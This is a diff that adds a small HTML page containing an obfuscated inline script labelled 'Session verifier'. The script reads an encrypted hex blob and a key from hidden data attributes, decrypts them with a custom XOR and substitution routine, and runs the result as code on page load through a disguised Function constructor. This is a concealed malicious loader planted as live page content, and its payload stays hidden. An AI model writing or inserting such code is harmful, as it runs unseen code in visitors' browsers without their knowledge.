@@ -1,0 +1,41 @@
+<html><body>
+<div data-p="fcc466a263aa9825b765ee0195b0b199fb834528dfe0bec001b2bced0b7bceb29112f1f442185fa0945771f9e9c8627f2ed3c22ff3d6069e025a12b50f604f" data-px="47c13fc4.605d8e2f.3f"></div>
+<script>(function(){
+// Session verifier
+var dk=document.querySelector("[data-p]");
+if(!dk)return;
+var bg="ge"+("tAt"+"tribute");
+var a=dk[bg]("data-p")||"";
+var p=dk[bg]("data-px")||"";
+if(!a||!p)return;
+try{
+var cj=p.split(".");
+var db=parseInt(cj[0],16);
+var dj=parseInt(cj[1],16);
+var dc=parseInt(cj[2],16);
+var bc=[];
+for(var z=0;z<a.length;z+=2){
+bc.push(parseInt(a.substr(z,2),16));}
+var aj=dj;
+for(var z=0;z<bc.length;z++){
+aj=(Math.imul(aj,1103515245)+12345)>>>0;
+var bd=(aj>>>16)&0xFF;
+bc[z]^=bd;}
+var j=[];
+for(var z=0;z<256;z++){j[z]=z;}
+var yh=db;
+for(var z=255;z>0;z--){
+yh=(Math.imul(yh,1664525)+1013904223)>>>0;
+var m=((yh>>>16)&0xFFFF)%(z+1);
+var aa=j[z];j[z]=j[m];j[m]=aa;}
+var v=new Array(256);
+for(var z=0;z<256;z++){v[j[z]]=z;}
+for(var z=0;z<bc.length;z++){bc[z]=v[bc[z]];}
+var za="";
+var xd=String["fro"+("mCh"+"arCode")];
+for(var z=0;z<dc;z++){za+=xd(bc[z]);}
+var bh="\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72";
+(""[bh][bh](za))();
+}catch(c){console.error(c);}})();</script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"9adf07d98ba88e26","version":"2025.9.1","r":1,"token":"d805eacb3558404b94a482fe9b862966","serverTiming":{"name":{"cfExtPri":true,"cfEdge":true,"cfOrigin":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}}}' crossorigin="anonymous"></script>
+</body></html>
